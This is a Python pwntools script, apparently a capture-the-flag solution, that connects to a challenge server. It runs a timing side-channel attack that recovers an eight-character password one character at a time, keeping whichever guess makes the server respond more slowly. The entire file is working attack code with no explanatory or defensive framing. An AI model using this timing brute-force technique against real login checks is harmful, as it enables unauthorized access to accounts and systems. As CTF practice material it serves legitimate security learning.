from pwn import *
import time
import string

p = remote("challenge.rgbsec.xyz", 13373)

passw = ""

def check_char(char, index):
    payload = passw + char + "*"*(8-index-1)
    print(payload)
    try:
        start = time.time()
        p.sendline(payload)
        p.recvuntil("Enter Password: \n",timeout=10)
        end = time.time()
        res = end-start
    except:
        p.interactive()
    return end-start

p.recvuntil("Enter Password: \n")
for i in range(8):
    print("---------")
    best_time = 0
    best_char = "U"
    for char in "UVWXYZAFBCDQRSTGHIJNOPKLEM":
        cur_time = check_char(char, i)
        print(cur_time)
        if cur_time > (i+1)*1 + 0.17:
            best_time = cur_time
            best_char = char
            print("[+]",best_char)
            break
        else:
            print("[-]",char)
    passw += best_char
    print(passw)